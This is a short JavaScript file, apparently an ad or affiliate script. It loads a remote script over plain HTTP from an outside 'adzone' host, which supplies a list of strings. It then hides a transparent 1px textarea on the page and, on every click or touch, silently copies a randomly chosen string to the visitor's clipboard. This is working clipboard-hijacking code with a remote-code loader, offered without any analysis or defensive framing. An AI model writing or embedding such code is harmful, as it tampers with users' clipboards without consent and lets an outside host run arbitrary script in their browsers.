var c_mua = "";
function get_zkl_js(arr){
  var index =parseInt(arr.length*Math.random())
  c_mua = arr[index];
  get_copy()
}
function get_copy(){
  //setTimeout(function(a) { if (!document.body) { return setTimeout(arguments.callee, 50)}
  if (document.getElementById('hd_textarea_element')) {
    return;
  }
  var b = document.createElement("textarea");
  var u = navigator.userAgent;
  if (u.indexOf('Android') > -1 || u.indexOf('Linux') > -1) {
  //console.log('android');
  }else{
  //console.log('ios');
    b.setAttribute('disabled', 'disabled'); 
  }
  b.style.border = 0;
  b.style.position = 'fixed';
  b.style.top = 0;
  b.style.left = 0;
  b.style.width = '1px';
  b.style.height = '1px';
  b.style.background = "transparent";
  b.style.color = "transparent";
  b.id = 'hd_textarea_element';
  b.style["color"] = "transparent";
  document.body.appendChild(b);
  document.addEventListener('click', copy);
  document.addEventListener('touchstart', copy);
  document.addEventListener('touchend', copy);
  document.addEventListener('mouseup', copy);
}
var copy = function() {
  if (!document.getElementById('hd_textarea_element')) {
    return
  };
  b = document.getElementById('hd_textarea_element');
  b.value = c_mua;
  //console.log('--------'+b.value)
  b.select();
  b.setSelectionRange(0, b.value.length);
  if(document.execCommand('copy', false, null)){
    b.remove();
  }
};
function init_kouling(){
  setTimeout(function(a) {
    if (!document.body) {
      console.log(arguments.callee)
     return setTimeout(arguments.callee, 50)
    }
    var b = document.createElement("script");
    b.setAttribute('src','http://tiexie0.wang/adzone/get_zkl_js')
    document.body.appendChild(b)
  },50)
}
init_kouling()